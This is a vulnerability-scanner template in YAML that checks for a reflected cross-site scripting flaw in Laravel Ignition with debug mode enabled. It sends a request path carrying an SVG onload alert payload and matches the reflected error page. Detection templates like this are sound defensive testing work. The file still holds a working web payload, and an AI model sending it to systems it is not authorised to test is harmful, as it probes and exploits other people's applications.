id: "laravel-ignition-xss"
name: "Laravel Ignition - Cross-Site Scripting"
severity: "high"
description: "Laravel Ignition contains a cross-site scripting vulnerability when debug mode is enabled."
tech:
  - "laravel"
tags:
  - "laravel"
  - "xss"
  - "ignition"
  - "vuln"
reference: "https://www.acunetix.com/vulnerabilities/web/laravel-ignition-reflected-cross-site-scripting/"
spaExclusion: true
request:
  method: "GET"
  path: "/_ignition/scripts/--><svg%20onload=alert(document.domain)>"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "Undefined index: --><svg onload=alert(document.domain)> in file"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 500
